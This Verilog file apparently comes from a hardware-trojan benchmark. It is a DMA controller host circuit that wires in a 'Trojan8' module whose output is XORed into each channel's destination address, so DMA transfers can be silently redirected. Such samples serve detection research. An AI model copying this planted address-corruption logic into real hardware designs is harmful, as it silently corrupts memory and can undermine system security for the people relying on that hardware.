// DMA Controller Host Circuit for Trojan8
// Interface: a[7:0], b[7:0], c[7:0], d[7:0], e[7:0], sel[2:0] -> y[15:0]
module trojan8_dma_host #(
    parameter DMA_CHANNELS = 4,           // Number of DMA channels
    parameter BUFFER_SIZE = 256,          // DMA buffer size
    parameter [111:0] DMA_PATTERN = 112'hFEDCBA9876543210123456789ABC  // DMA transfer pattern
)(
    input wire clk,
    input wire rst,
    input wire [31:0] src_addr,
    input wire [31:0] dst_addr,
    input wire [15:0] transfer_len,
    input wire [1:0] channel_sel,
    input wire dma_start,
    input wire dma_abort,
    output reg [31:0] transfer_count,
    output reg dma_busy,
    output reg dma_done
);

    // Trojan interface
    wire [7:0] trojan_a;
    wire [7:0] trojan_b;
    wire [7:0] trojan_c;
    wire [7:0] trojan_d;
    wire [7:0] trojan_e;
    wire [2:0] trojan_sel;
    wire [15:0] trojan_y;
    
    // DMA controller components
    reg [31:0] channel_src [0:3];     // Fixed to 4 channels
    reg [31:0] channel_dst [0:3];     // Fixed to 4 channels
    reg [15:0] channel_len [0:3];     // Fixed to 4 channels
    reg [31:0] channel_count [0:3];   // Fixed to 4 channels
    reg [3:0] channel_status;         // One bit per channel
    reg [111:0] dma_gen;
    reg [2:0] dma_state;
    reg [1:0] active_channel;
    reg [7:0] burst_counter;
    reg [31:0] current_src, current_dst;
    
    integer n;
    
    // DMA controller state machine
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            dma_gen <= DMA_PATTERN;
            dma_state <= 3'h0;
            active_channel <= 2'h0;
            burst_counter <= 8'h0;
            current_src <= 32'h0;
            current_dst <= 32'h0;
            channel_status <= 4'h0;
            transfer_count <= 32'h0;
            dma_busy <= 1'b0;
            dma_done <= 1'b0;
            
            for (n = 0; n < 4; n = n + 1) begin
                channel_src[n] <= 32'h0;
                channel_dst[n] <= 32'h0;
                channel_len[n] <= 16'h0;
                channel_count[n] <= 32'h0;
            end
        end else begin
            dma_gen <= {dma_gen[110:0], dma_gen[111]};
            dma_done <= 1'b0;
            
            case (dma_state)
                3'h0: begin // IDLE
                    dma_busy <= 1'b0;
                    if (dma_start && {30'h0, channel_sel} < DMA_CHANNELS) begin  // Extend to 32-bit
                        channel_src[channel_sel] <= src_addr;
                        channel_dst[channel_sel] <= dst_addr ^ {16'h0, trojan_y};
                        channel_len[channel_sel] <= transfer_len;
                        channel_count[channel_sel] <= 32'h0;
                        channel_status[channel_sel] <= 1'b1;
                        active_channel <= channel_sel;
                        dma_state <= 3'h1;
                    end else if (dma_abort) begin
                        channel_status <= 4'h0;
                    end
                end
                3'h1: begin // SETUP
                    current_src <= channel_src[active_channel];
                    current_dst <= channel_dst[active_channel];
                    burst_counter <= 8'h0;
                    dma_busy <= 1'b1;
                    dma_state <= 3'h2;
                end
                3'h2: begin // TRANSFER
                    if (channel_count[active_channel] < {16'h0, channel_len[active_channel]} && channel_count[active_channel] < BUFFER_SIZE) begin  // Use BUFFER_SIZE
                        channel_count[active_channel] <= channel_count[active_channel] + 1;
                        current_src <= current_src + 4;
                        current_dst <= current_dst + 4;
                        burst_counter <= burst_counter + 1;
                        
                        if (burst_counter >= 8'h0F) begin
                            dma_state <= 3'h3;
                        end
                    end else begin
                        dma_state <= 3'h4;
                    end
                end
                3'h3: begin // BURST_WAIT
                    burst_counter <= 8'h0;
                    dma_state <= 3'h2;
                end
                3'h4: begin // COMPLETE
                    transfer_count <= channel_count[active_channel];
                    channel_status[active_channel] <= 1'b0;
                    // Signal DMA completion with channel status
                    dma_busy <= (channel_status != 4'h0);
                    dma_done <= 1'b1;
                    dma_state <= 3'h0;
                end
                default: dma_state <= 3'h0;
            endcase
        end
    end
    
    // Connect trojan inputs
    assign trojan_a = dma_gen[7:0];
    assign trojan_b = current_src[7:0];
    assign trojan_c = current_dst[7:0];
    assign trojan_d = channel_len[active_channel][7:0];
    assign trojan_e = burst_counter;
    assign trojan_sel = dma_state;
    
    // Instantiate Trojan8
    Trojan8 #(
        .MASK_00FF(16'h00C3),
        .MASK_0F(8'h06),
        .MASK_F0F0(16'hC3C3)
    ) trojan_inst (
        .a(trojan_a),
        .b(trojan_b),
        .c(trojan_c),
        .d(trojan_d),
        .e(trojan_e),
        .sel(trojan_sel),
        .y(trojan_y)
    );

endmodule
